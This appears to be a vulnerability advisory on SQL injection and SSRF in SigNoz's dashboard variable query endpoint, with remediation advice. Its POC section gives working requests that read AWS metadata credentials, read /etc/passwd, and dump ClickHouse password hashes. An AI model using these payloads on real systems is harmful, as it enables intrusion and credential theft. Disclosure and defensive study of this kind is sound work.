# SigNoz ClickHouse SQL Injection via /api/v2/variables/query Dashboard Variable Query

## Summary
SigNoz contains a SQL injection and Server-Side Request Forgery (SSRF) vulnerability in the `/api/v2/variables/query` endpoint. Authenticated low-privilege users (Viewer role) can execute arbitrary ClickHouse SQL queries. Due to insufficient blacklist filtering, attackers can bypass DDL restrictions using line breaks and utilize ClickHouse table functions (`url`, `file`, `remote`, `s3`) to perform SSRF, read server files, and steal database credentials.

## Details
The vulnerability exists due to an insecure source-to-sink data flow where untrusted user input from an HTTP request is directly concatenated and executed as a SQL query.

1. **Source**: The POST request body is parsed in the `prepareQuery` function at `pkg/query-service/app/http_handler.go` (approx. line 1018).
2. **Filter / Bypass**: At `pkg/query-service/app/http_handler.go` (lines 1024-1037), the application uses a simple blacklist using `strings.Contains` covering only 6 DDL operations (`alter table`, `drop table`, `truncate table`, `drop database`, `drop view`, `drop function`). This check is case-insensitive but easily bypassable. Furthermore, it places no restrictions on `SELECT` queries using dangerous ClickHouse table functions.
3. **Sink**: The blindly trusted query string is passed to `QueryDashboardVars` at `pkg/query-service/app/http_handler.go` (line 1159), which reaches `pkg/query-service/app/clickhouseReader/reader.go` (line 2923) and is executed directly by `r.db.Query(ctx, query)`.

Key vulnerable code snippet in `pkg/query-service/app/http_handler.go`:
```go
func prepareQuery(r *http.Request) (string, error) {
    // ...
    var postData *model.DashboardVars
    json.NewDecoder(r.Body).Decode(postData)
    query := strings.TrimSpace(postData.Query)
    
    notAllowedOps := []string{"alter table","drop table","truncate table","drop database","drop view","drop function"}
    for _, op := range notAllowedOps {
        if strings.Contains(strings.ToLower(query), op) {
            return "", fmt.Errorf("operation %s is not allowed", op)
        }
    }
    return newQuery, nil
}
```

## POC
**Preconditions**:
- Valid JWT token of a user with `Viewer` role.
- Target system running ClickHouse with default configurations (table functions not explicitly disabled).

**Steps**:
1. Obtain a valid JWT token for a Viewer user via `POST /api/v1/getSessions`.
2. Perform an SSRF attack using the `url()` table function to access the AWS metadata endpoint:
```http
POST /api/v2/variables/query
Authorization: Bearer <token>
Content-Type: application/json

{"query": "SELECT * FROM url('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'JSON')"}
```
3. Read local server files using the `file()` table function:
```http
POST /api/v2/variables/query
Authorization: Bearer <token>
Content-Type: application/json

{"query": "SELECT * FROM file('/etc/passwd', 'LineAsString')"}
```
4. Extract ClickHouse system credentials:
```http
POST /api/v2/variables/query
Authorization: Bearer <token>
Content-Type: application/json

{"query": "SELECT name, password_sha256_hex FROM system.users"}
```

## Impact
This vulnerability allows an authenticated low-privileged attacker to execute arbitrary ClickHouse SQL commands. Successful exploitation can lead to Server-Side Request Forgery (SSRF) to access internal networks and cloud metadata endpoints, exposure of sensitive local files, theft of database credentials, and unauthorized modification/deletion of database objects (by bypassing the DDL blacklist using newline characters).

## Remediation
1. Implement a strict whitelist mechanism for query validation or use parameterized queries.
2. Replace string matching with a proper SQL parser to validate the query syntax and allowed operations.
3. Apply least privilege principles by creating a dedicated restricted ClickHouse user for these specific queries, granting `SELECT` privileges only on business-related tables.
4. Explicitly disable dangerous ClickHouse table functions (`url`, `file`, `remote`, `s3`) in `users.xml` if they are not required.

## Disclosure Notes
This report is based on source code analysis and contextual verification of the vulnerable data flow path. Direct exploitation requires authentication with at least Viewer privileges.

## Supplemental Information
### Affected products
SigNoz
### Severity
- Scoring method: CVSS v3.1
- Score: 9.9
- Vector string: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
### Weaknesses
- CWE: CWE-89
- CWE: CWE-918
